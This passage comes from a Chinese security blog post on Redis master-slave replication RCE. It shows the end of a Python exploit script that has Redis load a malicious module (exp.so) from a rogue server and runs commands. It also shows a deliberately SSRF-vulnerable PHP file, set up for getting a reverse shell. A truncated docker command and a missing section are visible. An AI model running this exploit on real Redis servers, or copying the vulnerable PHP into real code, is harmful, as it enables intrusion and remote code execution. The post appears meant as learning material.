class="hljs-string">&quot;lport&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>,<br>    <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;rogue server listen port, default 21000&quot;</span>, default=<span class="hljs-number">21000</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&quot;--file&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;RedisModules to load, default exp.so&quot;</span>, default=<span class="hljs-string">&#x27;exp.so&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--command&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Command that you want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;id&#x27;</span>)<br><br>parser.add_argument(<span class="hljs-string">&quot;-a&quot;</span>, <span class="hljs-string">&quot;--auth&quot;</span>, dest=<span class="hljs-string">&quot;auth&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;redis password&quot;</span>)<br>options = parser.parse_args()<br><br>filename = options.file<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(filename):<br>	logging.info(<span class="hljs-string">&quot;Where you module? &quot;</span>)<br>	sys.exit(<span class="hljs-number">1</span>)<br><br>result = exploit(options.rhost, options.rport, options.lhost, options.lport, filename, options.command, options.auth)<br><span class="hljs-built_in">print</span>(result)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure>
<h1>0x06 SSRF+Redis 反弹shell</h1>
<p>参照Redis手动getshell的过程，可轻易实现SSRF+Redis反弹shell。</p>
<p>以curl为例，漏洞代码为ssrf.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ocker run -itd -p 8088:80 php:7.2-apache --net=host</p>
<h1>0x08 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/325035.html">Redis主从复制RCE影响分析</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/11/25/Thm%E7%B3%BB%E5%88%97/">← 下一篇 Thm-Intro to Offensive Security</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/11/22/%E6%B5%85%E6%9E%90%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/">堆栈平衡的学习 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 主从复制原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 Redis主从复制手动挡</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 痕迹清除</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 利用脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 SSRF+Redis 反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x08 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>